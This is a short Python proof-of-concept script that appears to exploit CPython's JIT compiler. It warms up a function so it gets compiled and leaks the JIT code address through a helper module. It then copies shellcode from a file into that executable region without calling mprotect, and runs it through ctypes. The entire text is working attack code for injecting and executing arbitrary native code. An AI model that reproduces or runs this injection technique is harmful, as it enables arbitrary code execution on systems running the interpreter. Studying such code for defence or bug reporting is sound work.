import ctypes
import jitexecleak

def hot_loop(x):
    acc = 0
    for _ in range(100_000):
        acc ^= x + 7
    return acc

for _ in range(1000):
    hot_loop(42)

addr = jitexecleak.leak_executor_jit(hot_loop)
print(f"[+] executor->jit_code: 0x{addr:x}")

with open("shellcode.bin", "rb") as f:
    shellcode = f.read()

# ⛔️ NO mprotect!
print("[*] Injecting shellcode WITHOUT mprotect...")
ctypes.memmove(addr, shellcode, len(shellcode))

FUNC = ctypes.CFUNCTYPE(None)
fn = FUNC(addr)
print("[*] Executing shellcode...")
fn()
